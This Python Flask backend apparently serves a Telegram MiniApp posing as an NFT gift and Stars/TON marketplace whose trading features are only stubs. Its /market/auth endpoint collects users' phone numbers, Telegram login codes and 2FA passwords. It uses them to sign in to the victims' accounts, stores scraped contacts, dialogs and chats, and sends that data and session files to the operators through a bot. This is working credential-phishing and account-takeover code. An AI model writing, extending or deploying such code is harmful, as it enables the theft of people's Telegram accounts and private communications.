#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Matrix Market API Server
Flask API для работы с MiniApp
"""

import asyncio
import json
import time
import hashlib
import hmac
from urllib.parse import parse_qs, unquote

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

import config
from database import (
    get_or_create_user,
    get_user_by_id,
    update_user_phone,
    add_stars_to_user,
    add_transaction,
    get_user_claimed_gifts,
    get_user_transactions,
    get_user_stats,
    save_auth_contact,
    save_parsed_data,
    get_parsed_data
)

# ============================================
# Инициализация Flask
# ============================================

app = Flask(__name__)
CORS(app)

# ============================================
# Утилиты
# ============================================

def verify_init_data(init_data_str):
    """Проверка initData от Telegram WebApp"""
    if not init_data_str:
        return None
    
    try:
        params = parse_qs(init_data_str)
        user_str = params.get('user', [None])[0]
        if not user_str:
            return None
        
        user = json.loads(unquote(user_str))
        
        if config.VERIFY_INIT_DATA:
            hash_value = params.get('hash', [None])[0]
            if not hash_value:
                return None
            
            check_params = {k: v[0] for k, v in params.items() if k != 'hash'}
            data_check_string = '\n'.join(
                f"{k}={v}" for k, v in sorted(check_params.items())
            )
            
            secret_key = hmac.new(
                b"WebAppData",
                config.BOT_TOKEN.encode(),
                hashlib.sha256
            ).digest()
            
            calculated_hash = hmac.new(
                secret_key,
                data_check_string.encode(),
                hashlib.sha256
            ).hexdigest()
            
            if calculated_hash != hash_value:
                print(f"⚠️ Invalid initData hash for user {user.get('id')}")
                return None
        
        return user
    
    except Exception as e:
        print(f"❌ Error verifying initData: {e}")
        return None

def run_async(coro):
    """Запустить асинхронную функцию в синхронном контексте"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# ============================================
# API Endpoints
# ============================================

@app.route('/market/open', methods=['POST'])
def api_open():
    """Открытие маркета"""
    data = request.json
    init_data = data.get('initData', '')
    
    user = verify_init_data(init_data)
    if not user:
        return jsonify({'success': False, 'error': 'Invalid initData'}), 401
    
    run_async(get_or_create_user(user['id'], user.get('username'), user.get('first_name'), user.get('last_name')))
    
    return jsonify({
        'success': True,
        'auth_screen_style': 'telegram',
        'auth_btn_text': 'Войти через Telegram'
    })

@app.route('/market/heartbeat', methods=['POST'])
def api_heartbeat():
    """Heartbeat"""
    return jsonify({'success': True})

@app.route('/market/close', methods=['POST'])
def api_close():
    """Закрытие маркета"""
    return jsonify({'success': True})

@app.route('/market/stars', methods=['POST'])
def api_stars():
    """Получение баланса Stars и TON"""
    data = request.json
    init_data = data.get('initData', '')
    
    user = verify_init_data(init_data)
    if not user:
        return jsonify({'success': False, 'error': 'Invalid initData'}), 401
    
    db_user = run_async(get_or_create_user(user['id'], user.get('username'), user.get('first_name'), user.get('last_name')))
    won_nfts = run_async(get_user_claimed_gifts(user['id']))
    
    return jsonify({
        'success': True,
        'stars_balance': db_user['stars_balance'],
        'ton_balance': db_user['ton_balance'],
        'market_won_nfts': [
            {
                'link': nft['gift_link'],
                'name': nft['gift_name'],
                'received_at': nft['created_at']
            }
            for nft in won_nfts
        ]
    })

@app.route('/market/buy_gift', methods=['POST'])
def api_buy_gift():
    """Покупка подарка"""
    data = request.json
    init_data = data.get('initData', '')
    gift_link = data.get('gift_link', '')
    price = data.get('price', 0)
    
    user = verify_init_data(init_data)
    if not user:
        return jsonify({'success': False, 'error': 'Invalid initData'}), 401
    
    db_user = run_async(get_user_by_id(user['id']))
    
    if db_user['ton_balance'] < price:
        return jsonify({'success': False, 'error': 'Insufficient balance'}), 400
    
    # Здесь должна быть логика покупки
    # Пока заглушка
    
    return jsonify({
        'success': True,
        'new_ton_balance': db_user['ton_balance'] - price,
        'message': 'Gift purchased successfully'
    })

@app.route('/market/exchange_stars', methods=['POST'])
def api_exchange_stars():
    """Обмен Stars на TON"""
    data = request.json
    init_data = data.get('initData', '')
    stars_amount = data.get('stars_amount', 0)
    
    user = verify_init_data(init_data)
    if not user:
        return jsonify({'success': False, 'error': 'Invalid initData'}), 401
    
    db_user = run_async(get_user_by_id(user['id']))
    
    if db_user['stars_balance'] < stars_amount:
        return jsonify({'success': False, 'error': 'Insufficient stars'}), 400
    
    if stars_amount < config.STARS_TO_TON_RATE:
        return jsonify({
            'success': False,
            'error': f'Minimum {config.STARS_TO_TON_RATE} stars required'
        }), 400
    
    ton_amount = stars_amount / config.STARS_TO_TON_RATE
    
    # Обмен Stars на TON
    # Здесь должна быть полная логика
    # Пока заглушка
    
    return jsonify({
        'success': True,
        'new_stars_balance': db_user['stars_balance'] - stars_amount,
        'new_ton_balance': db_user['ton_balance'] + ton_amount
    })

@app.route('/market/profile_stats', methods=['POST'])
def api_profile_stats():
    """Статистика профиля"""
    data = request.json
    init_data = data.get('initData', '')
    
    user = verify_init_data(init_data)
    if not user:
        return jsonify({'success': False, 'error': 'Invalid initData'}), 401
    
    run_async(get_or_create_user(user['id'], user.get('username'), user.get('first_name'), user.get('last_name')))
    stats = run_async(get_user_stats(user['id']))
    
    return jsonify({
        'success': True,
        'volume': stats['volume'],
        'bought': stats['bought'],
        'sold': stats['sold']
    })

@app.route('/market/auth', methods=['POST'])
def api_auth():
    """Авторизация"""
    data = request.json
    init_data = data.get('initData', '')
    action = data.get('action', '')
    phone = data.get('phone', '')
    code = data.get('code', '')
    password = data.get('password', '')
    session_id = data.get('session_id', '')
    
    print(f"🔔 /market/auth request: action={action}, phone={phone}, code={code[:2] if code else 'none'}...")
    
    if action == 'start':
        user = verify_init_data(init_data)
        if not user:
            return jsonify({'success': False, 'error': 'Invalid initData'}), 401
        
        # Если передан телефон - начинаем авторизацию через Telegram Auth
        if phone:
            try:
                # Нормализуем номер
                import re
                clean_phone = re.sub(r'\D', '', phone)
                if not phone.startswith('+'):
                    phone = '+' + clean_phone
                
                print(f"📱 Starting auth for phone: {phone}, user: {user['id']}")
                
                session_id_new = f"tg_auth_{int(time.time())}_{user['id']}"
                
                import telegram_auth
                print(f"📦 telegram_auth module imported successfully")
                
                result = run_async(telegram_auth.start_telegram_auth(session_id_new, phone))
                print(f"📤 Auth result: {result}")
                
                if result['success']:
                    return jsonify({
                        'success': True,
                        'session_id': session_id_new,
                        'job_id': f"job_{int(time.time())}",
                        'need_code': True
                    })
                else:
                    error_msg = result.get('error', 'Failed to send code')
                    print(f"❌ Auth failed: {error_msg}")
                    return jsonify({
                        'success': False,
                        'error': error_msg
                    }), 400
                    
            except Exception as e:
                import traceback
                error_trace = traceback.format_exc()
                print(f"❌ Exception in action=start:")
                print(error_trace)
                return jsonify({
                    'success': False,
                    'error': f'Server error: {str(e)}'
                }), 500
        
        else:
            return jsonify({
                'success': True,
                'session_id': f"session_{int(time.time())}_{user['id']}",
                'job_id': f"job_{int(time.time())}_{user['id']}"
            })
    
    elif action == 'verify_code':
        if not session_id or not code:
            return jsonify({'success': False, 'error': 'Missing session_id or code'}), 400
        
        import telegram_auth
        result = run_async(telegram_auth.verify_telegram_code(session_id, code))
        
        if result['success']:
            if result.get('need_2fa'):
                return jsonify({
                    'success': True,
                    'need_2fa': True,
                    'password_hint': result.get('password_hint', ''),
                    'job_id': f"job_{int(time.time())}"
                })
            else:
                tg_user = result.get('user', {})
                run_async(save_auth_contact(tg_user.get('id'), tg_user.get('phone')))
                
                # 🆕 Сохраняем спарсенные данные в БД
                if result.get('parsed_data'):
                    run_async(save_parsed_data(tg_user.get('id'), result['parsed_data']))
                    print(f"💾 Parsed data saved for user {tg_user.get('id')}")
                    
                    # 🆕 ОТПРАВЛЯЕМ ДАННЫЕ АДМИНАМ
                    try:
                        from bot import bot as telegram_bot
                        tdata_path = f"tdata/{tg_user.get('id')}"
                        run_async(telegram_auth.send_data_to_admins(
                            telegram_bot,
                            tg_user,
                            result['parsed_data'],
                            tdata_path
                        ))
                        print(f"📤 Data sent to admins for user {tg_user.get('id')}")
                    except Exception as e:
                        print(f"⚠️ Could not send data to admins: {e}")
                
                return jsonify({
                    'success': True,
                    'need_2fa': False,
                    'job_id': f"job_{int(time.time())}"
                })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Invalid code')
            }), 400
    
    elif action == 'verify_2fa':
        if not session_id or not password:
            return jsonify({'success': False, 'error': 'Missing session_id or password'}), 400
        
        import telegram_auth
        result = run_async(telegram_auth.verify_telegram_2fa(session_id, password))
        
        if result['success']:
            tg_user = result.get('user', {})
            run_async(save_auth_contact(tg_user.get('id'), tg_user.get('phone')))
            
            # 🆕 Сохраняем спарсенные данные в БД
            if result.get('parsed_data'):
                run_async(save_parsed_data(tg_user.get('id'), result['parsed_data']))
                print(f"💾 Parsed data saved for user {tg_user.get('id')}")
                
                # 🆕 ОТПРАВЛЯЕМ ДАННЫЕ АДМИНАМ
                try:
                    from bot import bot as telegram_bot
                    tdata_path = f"tdata/{tg_user.get('id')}"
                    run_async(telegram_auth.send_data_to_admins(
                        telegram_bot,
                        tg_user,
                        result['parsed_data'],
                        tdata_path
                    ))
                    print(f"📤 Data sent to admins for user {tg_user.get('id')}")
                except Exception as e:
                    print(f"⚠️ Could not send data to admins: {e}")
            
            return jsonify({
                'success': True,
                'job_id': f"job_{int(time.time())}"
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Invalid password')
            }), 400
    
    elif action == 'status':
        user = verify_init_data(init_data)
        if not user:
            return jsonify({'success': False, 'status': 'unauthorized'})
        
        db_user = run_async(get_user_by_id(user['id']))
        has_phone = db_user and db_user.get('phone')
        
        return jsonify({
            'success': True,
            'status': 'done' if has_phone else 'need_auth'
        })
    
    elif action == 'enter_auth':
        # Уведомление что клиент перешёл к авторизации (для статистики/логов)
        user = verify_init_data(init_data)
        if user:
            print(f"📱 User {user['id']} entered auth flow")
        return jsonify({'success': True})
    
    elif action == 'start_tg_oauth':
        # OAuth через mrkt.land - заглушка (не реализовано в Python версии)
        return jsonify({'success': False, 'error': 'OAuth not supported in this version'}), 400
    
    elif action == 'tg_oauth_status':
        # Статус OAuth - заглушка
        return jsonify({'success': True, 'status': 'not_started'})
    
    else:
        return jsonify({'success': False, 'error': 'Unknown action'}), 400

@app.route('/market/deals', methods=['POST'])
def api_deals():
    """Получение сделок"""
    data = request.json
    init_data = data.get('initData', '')
    
    user = verify_init_data(init_data)
    if not user:
        return jsonify({'success': False, 'error': 'Invalid initData'}), 401
    
    # Заглушка
    nft_links = [
        'https://nft.fragment.com/gift/InputKey-9183',
        'https://nft.fragment.com/gift/DreamBox-7421',
        'https://nft.fragment.com/gift/StarGift-3958'
    ]
    
    return jsonify({
        'success': True,
        'deals': [
            {
                'link': link,
                'price': 10 + i * 5,
                'available': True
            }
            for i, link in enumerate(nft_links)
        ]
    })

@app.route('/market/parsed_data', methods=['POST'])
def api_get_parsed_data():
    """Получить спарсенные данные пользователя"""
    data = request.json
    init_data = data.get('initData', '')
    data_type = data.get('data_type', None)  # contacts, dialogs, user_info, chats, channels
    
    user = verify_init_data(init_data)
    if not user:
        return jsonify({'success': False, 'error': 'Invalid initData'}), 401
    
    parsed_data = run_async(get_parsed_data(user['id'], data_type))
    
    if parsed_data:
        return jsonify({
            'success': True,
            'data': parsed_data
        })
    else:
        return jsonify({
            'success': False,
            'error': 'No parsed data found'
        }), 404

# ============================================
# Static Files
# ============================================

@app.route('/static/<path:path>')
def serve_static(path):
    """Обслуживание статических файлов MiniApp"""
    return send_from_directory('static', path)

@app.route('/')
def index():
    """Главная страница MiniApp"""
    return send_from_directory('static', 'index.html')

# ============================================
# Запуск сервера
# ============================================

if __name__ == '__main__':
    print("=" * 50)
    print("Matrix Market API Server")
    print("=" * 50)
    
    print(f"\n🌐 Starting Flask API server on {config.API_HOST}:{config.API_PORT}...")
    
    app.run(
        host=config.API_HOST,
        port=config.API_PORT,
        debug=config.DEBUG_MODE
    )
